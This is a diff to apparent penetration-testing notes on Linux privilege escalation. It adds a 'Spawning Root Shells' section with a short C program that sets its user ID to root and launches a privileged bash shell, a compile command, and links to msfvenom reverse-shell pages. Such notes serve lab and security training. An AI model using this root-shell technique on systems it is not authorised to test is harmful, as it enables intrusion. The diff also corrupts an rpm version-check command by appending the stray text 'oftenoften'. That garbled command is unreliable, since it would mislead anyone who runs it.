@@ -56,6 +56,37 @@ Speed Check:
 ./unix-privesc-check standard > filename.txt
 ```
 
+## Spawning Root Shells
+
+This is used in situations where commands can be executed as root. We can create our own executable and execute it as root.
+
+### C Executable
+
+There may be instances where some root process executes another process that you can control. Knowing this, we can create our own executable:
+
+```c
+int main() {
+    setuid(0);
+    system("/bin/bash -p");
+}
+```
+
+Compile the code:
+
+```bash
+gcc -o <name> <filename.c>
+```
+
+### Reverse Shells
+
+Alternatively, if a reverse shell is preferred, msfvenom can be used to generate an executable \(.elf\) file:
+
+{% embed url="https://wixnic.gitbook.io/hacknotes/shells/msfvenom" %}
+
+Otherwise, you may manually add shells to a file:
+
+{% embed url="https://wixnic.gitbook.io/hacknotes/shells/unix-linux-shells" %}
+
 ## System Information
 
 ### Operating System 
@@ -382,7 +413,7 @@ Running the program with the --version/-v command-line option shows the version 
 <program> --version
 <program> -v
 dpkg -l | grep <program>
-rpm –qa | grep <program>
+rpm –qa | grep <program>oftenoften
 ```
 
 #### Service Privilege Escalation
